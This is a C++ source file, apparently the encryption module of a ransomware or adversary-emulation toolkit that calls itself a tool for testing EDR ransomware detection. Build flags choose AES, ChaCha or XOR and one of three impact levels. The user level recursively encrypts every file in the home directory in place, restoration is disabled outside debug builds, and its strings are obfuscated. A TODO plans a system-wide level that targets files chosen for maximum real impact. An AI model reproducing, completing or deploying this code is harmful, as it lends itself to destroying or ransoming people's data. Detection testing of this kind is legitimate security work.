#include "modules/impact/Encryption.hpp"
#include "modules/impact/EncryptionStrategies.hpp"
#include "utils/Logger.hpp"
#include "utils/CryptoUtils.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Obfuscation.hpp"
#include "core/Config.hpp"
#include <filesystem>

EncryptionMethod::EncryptionMethod() {
    #if defined(ALGO_AES)
        strategy = std::make_unique<AesEncryptionStrategy>();
        LOG_INFO("Encryption initialized with AES strategy")
    #elif defined(ALGO_CHACHA)
        strategy = std::make_unique<ChaChaEncryptionStrategy>();
        LOG_INFO("Encryption initialized with CHACHA strategy")
    #else
        strategy = std::make_unique<XorEncryptionStrategy>();
        LOG_INFO("Encryption initialized with XOR strategy")
    #endif
}

void EncryptionMethod::applyCrypto(bool encrypt) {
    std::string homeDir = SystemUtils::GetUserHome();
    std::string action = encrypt ? "Encrypting" : "Restoring";

    #ifdef IMPACT_LEVEL_TEST
        std::string targetPath = homeDir + "/" + OBFL(".ghost_test");
        LOG_INFO("[TEST] {} files in {}", action, targetPath)

        if (encrypt && !std::filesystem::exists(targetPath)) {
            FileUtils::WriteFile(targetPath, OBFL("Testing EDR ransomware detection"));
        }

        try {
            std::string content = FileUtils::ReadFile(targetPath);
            if (!content.empty()) {
                std::string processed = encrypt ? strategy->encrypt(content, Config::ENCRYPTION_KEY) : strategy->decrypt(content, Config::ENCRYPTION_KEY);

                if (FileUtils::WriteFile(targetPath, processed)) {
                    LOG_SUCCESS("Processed {}", targetPath)
                }
            }
        } catch (const std::exception &e) {
            LOG_ERROR("Encryption failed: {}", e.what())
        }
    #elif defined(IMPACT_LEVEL_USER)
        LOG_INFO("[USER] {} files in {}", action, homeDir)

        auto files = FileUtils::ListFilesRecursively(homeDir);
        int successCount = 0;

        for (const auto& filePath : files) {
            try {
                std::string content = FileUtils::ReadFile(filePath);
                if (content.empty()) continue;

                std::string processed = encrypt ? strategy->encrypt(content, Config::ENCRYPTION_KEY) : strategy->decrypt(content, Config::ENCRYPTION_KEY);

                if (!encrypt && processed.empty() && !content.empty()) {
                    LOG_ERROR("Decryption resulted in empty content for {}", filePath);
                    continue;
                }

                if (FileUtils::WriteFile(filePath, processed)) {
                    LOG_INFO("{} {}", (encrypt ? "Encrypted" : "Decrypted"), filePath)
                    successCount++;
                }
            } catch (const std::exception& e) {
                LOG_ERROR("Failed to encrypt {}", filePath, e.what())
            }
        }
        LOG_SUCCESS("[USER] Encryption summary: encrypted {} files", successCount)
    #elif defined(IMPACT_LEVEL_SYSTEM)
        std::string targetDir = OBFL("/var/www/html"); // random path for now; think through
        LOG_INFO("[SYSTEM] {} files in {}", action, targetDir)

        LOG_ALERT("TODO for now. Encrypting full drive would take too long; figure out crucial files to simulate real impact in shortest time")
    #endif
}

bool EncryptionMethod::trigger() {
    applyCrypto(true);
    return true;
}

bool EncryptionMethod::restore() {
    #ifdef DEBUG_MODE
        applyCrypto(false);
        return true;
    #else
        LOG_ALERT("Restoration disabled in non-debug builds")
        return false;
    #endif
}
